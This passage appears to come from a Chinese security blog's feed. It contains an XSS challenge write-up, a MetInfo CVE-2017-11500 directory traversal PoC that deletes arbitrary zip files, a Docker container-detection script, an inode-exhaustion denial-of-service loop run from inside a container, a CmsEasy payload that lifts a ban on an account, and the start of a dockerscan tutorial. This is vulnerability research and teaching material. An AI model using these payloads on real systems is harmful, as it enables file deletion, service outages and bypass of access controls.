class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">header(<span class="string">'X-XSS-Protection:0'</span>);</span></span><br><span class="line"><span class="php">header(<span class="string">'Content-Type:text/html;charset=utf-8'</span>);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"x-ua-compatible"</span> <span class="attr">content</span>=<span class="string">"IE=10"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">''</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'hidden'</span> <span class="attr">name</span>=<span class="string">'token'</span> <span class="attr">value</span>=<span class="string">'&lt;?php</span></span></span><br><span class="line"><span class="tag"><span class="string">  echo htmlspecialchars($_GET['</span><span class="attr">token</span>']); ?&gt;</span>'&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'submit'</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><strong>解题思路</strong><br>参考<a href="https://www.waitalone.cn/xss-in-hidden-input-fields.html" target="_blank" rel="noopener">当XSS遇到input hidden属性</a>，利用accesskey在Firefox下成功执行,在Firefox下，使用ALT+SHIFT+X快捷键来触发XSS，请求URL如下：<br><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ec2<span class="string">-13</span><span class="string">-58</span><span class="string">-146</span><span class="string">-2</span>.us-east<span class="string">-2</span>.compute.amazonaws.com/xss14.php?token=123' accesskey='X' onclick='alert(document.domain)'//</span><br></pre></td></tr></table></figure></p><h3 id="6-XSS-passive-element"><a href="#6-XSS-passive-element" class="headerlink" title="6.XSS-passive element"></a>6.XSS-passive element</h3><p><strong>源码文件</strong><br>xss17.php<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">header(<span class="string">"Content-Type:text/html;charset=utf-8"</span>);</span></span><br><span class="line"><span class="php">header(<span class="string">"X-Content-Type-Options: nosniff"</span>);</span></span><br><span class="line"><span class="php">header(<span class="string">"X-FRAME-OPTIONS: DENY"</span>);</span></span><br><span class="line"><span class="php">header(<span class="string">"X-XSS-Protection: 0"</span>);</span></span><br><span class="line"><span class="php">$content=$_GET[<span class="string">"content"</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;div data-content='"</span>.htmlspecialchars($content).<span class="string">"'&gt;"</span>;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p><p><strong>解题思路</strong><br>参考<a href="https://html5sec.org/" target="_blank" rel="noopener">XSS without User Interaction from passive Elements</a>，可以在除了Firefox下的浏览器上非交互直接执行XSS代码<br><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ec2<span class="string">-13</span><span class="string">-58</span><span class="string">-146</span><span class="string">-2</span>.us-east<span class="string">-2</span>.compute.amazonaws.com/xss17.php?content=1' onfocus='alert(1)' contenteditable tabindex='0' id='xss</span><br></pre></td></tr></table></figure></p><p>朋友也提到使用上一题的accesskey也可以，但是只能在Firefox下，使用ALT+SHIFT+X快捷键来触发XSS<br><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ec2<span class="string">-13</span><span class="string">-58</span><span class="string">-146</span><span class="string">-2</span>.us-east<span class="string">-2</span>.compute.amazonaws.com/xss17.php?content=xss ' accesskey=X  onclick=alert(1) id='xss</span><br></pre></td></tr></table></figure></p><h2 id="0x03小结"><a href="#0x03小结" class="headerlink" title="0x03小结"></a>0x03小结</h2><p>此处XSS挑战学习了很多的新姿势，但是有不少情况存在一定的局限性，要求特定浏览器、特定版本、操作系统等。当然作为技术交流，这次的挑战赛很赞。</p>]]></content>
      
      <categories>
          
          <category> Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Security </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Metinfo最新版5.3.17后台目录遍历Bypass</title>
      <link href="/2017/07/20/Metinfo-directory-traversal-bypass/"/>
      <url>/2017/07/20/Metinfo-directory-traversal-bypass/</url>
      <content type="html"><![CDATA[<h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11500" target="_blank" rel="noopener">CVE-2017-11500</a>这个漏洞比较鸡肋，Metinfo最新版5.3.17后台某处目录遍历Bypass，可以删除任意zip文件。<br><a id="more"></a></p><h2 id="0x02漏洞详情"><a href="#0x02漏洞详情" class="headerlink" title="0x02漏洞详情"></a>0x02漏洞详情</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /admin/system/database/filedown.php</span></span><br><span class="line"><span class="keyword">if</span>($action==<span class="string">'delete'</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(substr_count(trim($filenames),<span class="string">'../'</span>))<span class="keyword">die</span>(<span class="string">'met2'</span>);</span><br><span class="line"><span class="keyword">if</span>(fileext($filenames)==<span class="string">'zip'</span>)&#123;</span><br><span class="line">@unlink(<span class="string">'../../databack/'</span>.$fileon.<span class="string">'/'</span>.$filenames);</span><br><span class="line">&#125;</span><br><span class="line">metsave($rurls,<span class="string">''</span>,$depth);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>检测如果$filenames包含<code>../</code>则直接退出，但是这个很容易利用<code>..\</code>即可Bypass，然后检测文件的后缀名如果是zip就直接删除文件，所以存在目录遍历删除任意的zip文件。<br>POC如下：<br><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="string">//localhost/MetInfo5.3/admin/system/database/filedown.php</span>?anyid=13&amp;action=delete&amp;filenames=<span class="string">..</span>\<span class="string">..</span>\<span class="string">..</span>\<span class="string">..</span>\<span class="string">..</span>\<span class="string">..</span>\<span class="string">..</span>\<span class="string">..</span>\<span class="string">..</span>\<span class="string">..</span>\<span class="string">..</span>\<span class="string">..</span>\<span class="string">..</span>\<span class="string">..</span>\test.zip&amp;fileon=web&amp;lang=cn</span><br></pre></td></tr></table></figure></p><p><img src="http://blackwolfsec.cc/static/picture/metinfo-1.jpg" alt="目录遍历"></p><h2 id="0x02小结"><a href="#0x02小结" class="headerlink" title="0x02小结"></a>0x02小结</h2><p><code>/admin/system/database/filedown.php</code>文件的<code>$filenames</code>参数存在目录遍历删除任意的zip文件，此处没有CSRF防护，可以结合CSRF漏洞利用。</p>]]></content>
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> 代码审计 </tag>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Docker检测技术研究</title>
      <link href="/2017/07/11/docker-detection-technology/"/>
      <url>/2017/07/11/docker-detection-technology/</url>
      <content type="html"><![CDATA[<h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>随着Docker的广泛应用，获取一个云端服务器的控制权限之后，检测目标是一个真实机器还是在Docker容器环境中变得越来越重要<br><a id="more"></a></p><h2 id="0x01Docker检测"><a href="#0x01Docker检测" class="headerlink" title="0x01Docker检测"></a>0x01Docker检测</h2><p>Docker基于Linux的LXC提供虚拟化服务，为了对不同Docker容器（Container）进行有效的控制，需要在容器内初始化一些配置文件，因此，可以通过检测这类的配置文件检测是Docker容器内部还是在真实机器。</p><ul><li><p>基于/proc/self/cgroup内容是否包含”docker”的检测(左边Docker容器环境，右边真机环境)<br><img src="http://blackwolfsec.cc/static/picture/isdocker-1.jpg" alt="cgroup"></p></li><li><p>基于/proc/self/cpuset内容是否包含”docker”的检测(左边Docker容器环境，右边真机环境)<br><img src="http://blackwolfsec.cc/static/picture/isdocker-2.jpg" alt="cpuset"></p></li><li><p>基于是否包含存在”/.dockerenv”的检测(左边Docker容器环境，右边真机环境)<br><img src="http://blackwolfsec.cc/static/picture/isdocker-3.jpg" alt="dockerenv"></p></li></ul><h2 id="0x02检测脚本"><a href="#0x02检测脚本" class="headerlink" title="0x02检测脚本"></a>0x02检测脚本</h2><p>先看看检测效果(左边Docker容器环境，右边真机环境)</p><p><img src="http://blackwolfsec.cc/static/picture/isdocker-4.jpg" alt="isdocker"><br>源码如下，为了突出检测结果，增加了字体颜色修改<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">isDocker</span></span>()&#123;</span><br><span class="line"><span class="keyword">if</span> [ $(cat /proc/self/cgroup|grep -c <span class="string">"docker"</span>) -gt 1 ];</span><br><span class="line"><span class="keyword">then</span> </span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">"\033[31mThis is a Docker container\033[0m"</span>; </span><br><span class="line"><span class="keyword">elif</span> [ $(cat /proc/self/cpuset|grep -c <span class="string">"docker"</span>) -gt 1 ];</span><br><span class="line"><span class="keyword">then</span> </span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">"\033[31mThis is a Docker container\033[0m"</span>; </span><br><span class="line"><span class="keyword">elif</span> [  -f <span class="string">"/.dockerenv"</span> ];</span><br><span class="line"><span class="keyword">then</span>  </span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">"\033[31mThis is a Docker container\033[0m"</span>;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">"\033[34mThis is not a Docker container\033[0m"</span>;<span class="keyword">fi</span></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">isDocker</span><br></pre></td></tr></table></figure></p><p>使用方法<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://blackwolfsec.<span class="keyword">cc</span>/static/code/isDocker.<span class="keyword">sh</span> -O isDocker.<span class="keyword">sh</span> &amp;&amp; chmod +<span class="keyword">x</span> isDocker.<span class="keyword">sh</span>&amp;&amp; ./isDocker.<span class="keyword">sh</span></span><br></pre></td></tr></table></figure></p><p>如果不喜欢上面下载bash脚本的方式，也可以直接复制下面的命令到shell下执行检测<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> [[ $(cat /proc/self/cgroup|grep -c <span class="string">"docker"</span>) -gt 1 || $(cat /proc/self/cpuset|grep -c <span class="string">"docker"</span>) -gt 1 ||  -f <span class="string">"/.dockerenv"</span>  ]];<span class="keyword">then</span> <span class="built_in">echo</span> -e <span class="string">"\033[31mThis is a Docker container\033[0m"</span>;<span class="keyword">else</span> <span class="built_in">echo</span> -e <span class="string">"\033[34mThis is not a Docker container\033[0m"</span>;<span class="keyword">fi</span></span><br></pre></td></tr></table></figure></p><h2 id="0x03参考链接"><a href="#0x03参考链接" class="headerlink" title="0x03参考链接"></a>0x03参考链接</h2><ol><li><p><a href="http://tuhrig.de/how-to-know-you-are-inside-a-docker-container/" target="_blank" rel="noopener">http://tuhrig.de/how-to-know-you-are-inside-a-docker-container/</a></p></li><li><p><a href="https://github.com/sindresorhus/is-docker/blob/master/index.js" target="_blank" rel="noopener">https://github.com/sindresorhus/is-docker/blob/master/index.js</a></p></li><li><p><a href="https://forums.docker.com/t/how-can-a-process-detect-if-it-is-running-in-a-container/11123" target="_blank" rel="noopener">https://forums.docker.com/t/how-can-a-process-detect-if-it-is-running-in-a-container/11123</a></p></li><li><a href="https://github.com/pipedrive/containerized" target="_blank" rel="noopener">https://github.com/pipedrive/containerized</a></li></ol>]]></content>
      
      <categories>
          
          <category> Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Security </tag>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Docker拒绝服务攻击之Inode</title>
      <link href="/2017/07/06/docker-dos-attack-inode/"/>
      <url>/2017/07/06/docker-dos-attack-inode/</url>
      <content type="html"><![CDATA[<h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>Docker在各领域的应用越来越广泛，最近在分析Docker安全的相关内容，分享一个由于Inode导致的Docker拒绝服务攻击。<br><a id="more"></a></p><h2 id="0x01Inode简介及Docker安全"><a href="#0x01Inode简介及Docker安全" class="headerlink" title="0x01Inode简介及Docker安全"></a>0x01Inode简介及Docker安全</h2><p>1.Inode负责Linux文件系统中存储文件的信息，包括文件名、创建日期等，更加详细的介绍参考<a href="http://www.ruanyifeng.com/blog/2011/12/inode.html" target="_blank" rel="noopener">理解inode</a>，这里我们只关注在Linux文件系统中，每个文件需要有对应的Inode，而且Inode是一种有限的资源（类比：端口号只有65535个），如果Inode被使用完毕，即使磁盘还有剩余空间也无法建立新的文件，导致需要新建文件的服务无法正常运行。</p><p>2.众所周知，Docker利用Linux内核的Namespace、Capability、CGroup以及SELinux等提供系统层面的虚拟化服务，提供相比于传统的虚拟机（VM）技术更加轻量级的隔离容器（Container）服务。然而正由于多个容器共用一个底层操作系统，有些隔离措施的缺陷会导致Docker存在一定的安全风险。如果在一个容器内不断创建新的文件，就会把宿主机（真实主机）的文件系统的Inode消耗完毕，导致其他容器无法新建文件，导致服务异常，而且宿主机也不能新建其他容器，导致拒绝服务攻击。</p><h2 id="0x02实践过程"><a href="#0x02实践过程" class="headerlink" title="0x02实践过程"></a>0x02实践过程</h2><p>测试环境：</p><ul><li>Docker version 17.03.1-ce</li><li>Ubuntu 16.04</li><li>20G SSD腾讯云主机</li></ul><p>利用<code>Docker run -it tutum/lamp /bin/bash</code>启动容器，并获取bash命令shell<br>新建bash文件，实现循环新建空文件，消耗Inode资源，详细内容如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">i=1</span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span></span><br><span class="line"><span class="keyword">do</span> </span><br><span class="line">    i=$((<span class="variable">$i</span>+1));</span><br><span class="line">    touch <span class="variable">$i</span>;</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure></p><p>运行脚本等待一段时间，提示<code>No space left on device</code></p><p><img src="http://blackwolfsec.cc/static/picture/docker-dos-inode-1.png" alt="No space left on device"></p><p>此时在宿主机上用<code>df -i</code>命令查看Inode使用100%，于是所有的Inode资源被消耗完</p><p><img src="http://blackwolfsec.cc/static/picture/docker-dos-inode-2.png" alt="查看Inode使用情况"></p><p>如果尝试新建容器的失败，提示<code>no space left on device</code></p><p><img src="http://blackwolfsec.cc/static/picture/docker-dos-inode-3.png" alt="enter description here"></p><h2 id="0x03小结"><a href="#0x03小结" class="headerlink" title="0x03小结"></a>0x03小结</h2><p>Docker的不同容器共享同一个宿主机，虽然Docker有很多的安全隔离机制，但是有些资源的隔离存在缺陷。如果其中一个容器消耗完Inode资源会导致其他容器需要新建文件的所有功能异常，也会导致宿主机的功能异常，达到针对其他容器和宿主机的拒绝服务攻击。</p>]]></content>
      
      <categories>
          
          <category> Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Security </tag>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CmsEasy会员编辑资料安全性分析</title>
      <link href="/2017/06/01/cmseasy-security-1/"/>
      <url>/2017/06/01/cmseasy-security-1/</url>
      <content type="html"><![CDATA[<h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>最近一段时间尝试研究CmsEasy的安全性，分析了一下“会员编辑资料”功能的小问题。<br><a id="more"></a></p><h2 id="0x01会员编辑资料安全分析"><a href="#0x01会员编辑资料安全分析" class="headerlink" title="0x01会员编辑资料安全分析"></a>0x01会员编辑资料安全分析</h2><p>ps:<em>front::$post进行了一些XSS、SQL等过滤，另外还有360Web防火墙，所以此处不关注这些漏洞，关注逻辑问题</em><br>会员中心-&gt;编辑资料<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//D:\wamp64\www\cmseasy_5.6\lib\default\user_act.php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">edit_action</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (front::post(<span class="string">'submit'</span>)) &#123;</span><br><span class="line">        <span class="keyword">unset</span>(front::$post[<span class="string">'username'</span>]);</span><br><span class="line">        <span class="keyword">unset</span>(front::$post[<span class="string">'groupid'</span>]);</span><br><span class="line">        <span class="keyword">unset</span>(front::$post[<span class="string">'powerlist'</span>]);</span><br><span class="line">        <span class="keyword">unset</span>(front::$post[<span class="string">'password'</span>]);</span><br><span class="line">        <span class="keyword">if</span> (!is_email(front::$post[<span class="string">'e_mail'</span>])) &#123;</span><br><span class="line">            alerterror(lang(<span class="string">'mailbox_format_is_not'</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (front::$post <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">            <span class="keyword">if</span> (is_array($v) &amp;&amp; !<span class="keyword">empty</span>($v)) &#123;</span><br><span class="line">                front::$post[$k] = implode(<span class="string">','</span>, $v);</span><br><span class="line">            &#125;</span><br><span class="line">            front::check_type(front::post($k), <span class="string">'safe'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_user-&gt;rec_update(front::$post, <span class="string">"username='"</span>.session::get(<span class="string">'username'</span>).<span class="string">"'"</span>);</span><br><span class="line">        <span class="comment">//var_dump(front::$post);</span></span><br><span class="line">        front::flash(lang(<span class="string">'modify_data_successfully'</span>));</span><br><span class="line">        front::redirect(url::create(<span class="string">'user/index'</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;view-&gt;data = <span class="keyword">$this</span>-&gt;view-&gt;user;</span><br><span class="line">    <span class="comment">//var_dump($this-&gt;view-&gt;data);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>edit_action函数删除POST数据包中的username、groupid、powerlist、password字段，接着遍历POST数据，检测安全性，赋值后，调用$this-&gt;_user-&gt;rec_update更新数据库（这里考虑到PHP unset区分大小写，而Mysql不区分大小写，起初认为通过大小写绕过groupid的unset，直接提权为管理员，然而事与愿违……）<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> rec_update(<span class="variable">$row</span>,<span class="variable">$where</span>) &#123;</span><br><span class="line">    <span class="variable">$tbname</span>=<span class="variable">$this</span>-&gt;name;</span><br><span class="line">    <span class="variable">$sql</span>=<span class="variable">$this</span>-&gt;sql_update(<span class="variable">$tbname</span>,<span class="variable">$row</span>,<span class="variable">$where</span>);</span><br><span class="line">    <span class="regexp">//</span>echo <span class="variable">$sql</span>.<span class="string">"&lt;br&gt;"</span>;<span class="keyword">exit</span>;</span><br><span class="line">    return <span class="variable">$this</span>-&gt;query_unbuffered(<span class="variable">$sql</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>rec_update函数调用sql_update函数<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">//D:\wamp64\www\cmseasy_5.6\lib\inc\table.php</span><br><span class="line"><span class="keyword">function</span> sql_update(<span class="variable">$tbname</span>,<span class="variable">$row</span>,<span class="variable">$where</span>) &#123;</span><br><span class="line">    //var_dump(<span class="variable">$row</span>);</span><br><span class="line">    <span class="variable">$sqlud</span>=<span class="string">''</span>;</span><br><span class="line">    <span class="keyword">if</span> (is_string(<span class="variable">$row</span>))</span><br><span class="line">        <span class="variable">$sqlud</span> = <span class="variable">$row</span>.<span class="string">' '</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        foreach (<span class="variable">$row</span> as <span class="variable">$key</span>=&gt;<span class="variable">$value</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$key</span>,explode(<span class="string">','</span>,<span class="variable">$this</span>-&gt;getcolslist()))) &#123;</span><br><span class="line">                <span class="variable">$value</span>=<span class="variable">$value</span>;</span><br><span class="line">                /*<span class="keyword">if</span> (preg_match(<span class="string">'/^\[(.*)\]$/'</span>,<span class="variable">$value</span>,<span class="variable">$match</span>))</span><br><span class="line">                    <span class="variable">$sqlud</span> .= <span class="string">"`<span class="variable">$key</span>`"</span>.<span class="string">"= '"</span>.<span class="variable">$match</span>[1].<span class="string">"',"</span>;</span><br><span class="line">                <span class="keyword">else</span>*/<span class="keyword">if</span> (<span class="variable">$value</span> === <span class="string">""</span>)</span><br><span class="line">                    <span class="variable">$sqlud</span> .= <span class="string">"`<span class="variable">$key</span>`= NULL, "</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="variable">$sqlud</span> .= <span class="string">"`<span class="variable">$key</span>`"</span>.<span class="string">"= '"</span>.<span class="variable">$value</span>.<span class="string">"',"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="variable">$sqlud</span>=rtrim(<span class="variable">$sqlud</span>);</span><br><span class="line">    <span class="variable">$sqlud</span>=rtrim(<span class="variable">$sqlud</span>,<span class="string">','</span>);</span><br><span class="line">    <span class="variable">$this</span>-&gt;condition(<span class="variable">$where</span>);</span><br><span class="line">    <span class="variable">$sql</span>=<span class="string">"UPDATE `"</span>.<span class="variable">$tbname</span>.<span class="string">"` SET "</span>.<span class="variable">$sqlud</span>.<span class="string">" WHERE "</span>.<span class="variable">$where</span>;</span><br><span class="line">    //<span class="built_in">echo</span> <span class="variable">$sql</span>;</span><br><span class="line">    <span class="built_in">return</span> <span class="variable">$sql</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>sql_update函数调用$this-&gt;getcolslist()返回数据库中表的列名，接着用in_array判断字段名$key是否包含于数据库表的列名数组之内，如果不在数组之内直接忽略该字段。（in_array区分大小写，所以即使绕过了unset函数，也不能成功update数据库的username、groupid、powerlist、password字段）<br><strong>不能提权利用，但是由于遍历POST数据后update操作，存在其他的安全问题，可以修改数据库中原本没有权限直接修改的数据，比如：isblock、isdelete、checked、userip等</strong><br>例如：管理员在后台“冻结”并”清退”了test用户，该用户登录后修改资料，POST添加<code>isblock=0&amp;isdelete=0</code>数据包即可解除“冻结”和”清退”状态，payload如下:<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=test<span class="variable">&amp;nickname</span>=<span class="number">123</span><span class="variable">&amp;question</span>=<span class="variable">&amp;isblock</span>=<span class="number">0</span><span class="variable">&amp;isdelete</span>=<span class="number">0</span><span class="variable">&amp;answer</span>=<span class="variable">&amp;qq</span>=<span class="number">1111111111</span><span class="variable">&amp;e_mail</span>=test%<span class="number">40</span>test.com<span class="variable">&amp;tel</span>=<span class="number">18702111</span><span class="variable">&amp;address</span>=<span class="number">123123</span><span class="variable">&amp;intro</span>=<span class="number">123123</span><span class="variable">&amp;submit</span>=%E6%<span class="number">8F</span>%<span class="number">90</span>%E4%BA%A4</span><br></pre></td></tr></table></figure></p>]]></content>
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> Security </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>一款Docker攻击工具dockerscan</title>
      <link href="/2017/05/27/docker-security/"/>
      <url>/2017/05/27/docker-security/</url>
      <content type="html"><![CDATA[<h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>最近关注Docker安全，发现一个Docker security analysis &amp; hacking tools-<a href="https://github.com/cr0hn/dockerscan" target="_blank" rel="noopener">dockerscan</a><br><a id="more"></a></p><h2 id="0x01简单实践"><a href="#0x01简单实践" class="headerlink" title="0x01简单实践"></a>0x01简单实践</h2><p>1.下载tutum/lamp<br><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker</span> pull tutum/lamp</span><br></pre></td></tr></table></figure></p><p>2.导出docker镜像为文件<br><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">save</span> tutum/lamp -o  tutum_lamp</span><br></pre></td></tr></table></figure></p><p>3.简单分析<br><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># 输入命令</span></span><br><span class="line">dockerscan image info tutum_lamp </span><br><span class="line"><span class="meta"># 输出结果如下</span></span><br><span class="line">[<span class="meta"> * </span>] Starting analyzing docker image...</span><br><span class="line">[<span class="meta"> * </span>] Selected image: <span class="string">'tutum_lamp'</span></span><br><span class="line">[<span class="meta"> * </span>] Analysis finished. Results:</span><br><span class="line">[<span class="meta"> * </span>] - Docker version = <span class="number">1.9</span><span class="number">.1</span></span><br><span class="line">[<span class="meta"> * </span>] - Created date = <span class="number">2016</span><span class="number">-02</span><span class="number">-15</span>T10:<span class="number">35</span>:<span class="number">01.761164611</span>Z</span><br><span class="line">[<span class="meta"> * </span>] - Host name = dfc2eabdf236</span><br><span class="line">[<span class="meta"> * </span>] - Exposed ports:</span><br><span class="line">[<span class="meta"> * </span>]   &gt; <span class="number">3306</span>:</span><br><span class="line">[<span class="meta"> * </span>]     + tcp</span><br><span class="line">[<span class="meta"> * </span>]   &gt; <span class="number">80</span>:</span><br><span class="line">[<span class="meta"> * </span>]     + tcp</span><br><span class="line">[<span class="meta"> * </span>] - Author = Fernando Mayo , Feng Honglin </span><br><span class="line">[<span class="meta"> * </span>] - Cmd = /run.sh</span><br><span class="line">[<span class="meta"> * </span>] - Environment:</span><br><span class="line">[<span class="meta"> * </span>]   &gt; PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line">[<span class="meta"> * </span>]   &gt; DEBIAN_FRONTEND=noninteractive</span><br><span class="line">[<span class="meta"> * </span>]   &gt; PHP_UPLOAD_MAX_FILESIZE=<span class="number">10</span>M</span><br><span class="line">[<span class="meta"> * </span>]   &gt; PHP_POST_MAX_SIZE=<span 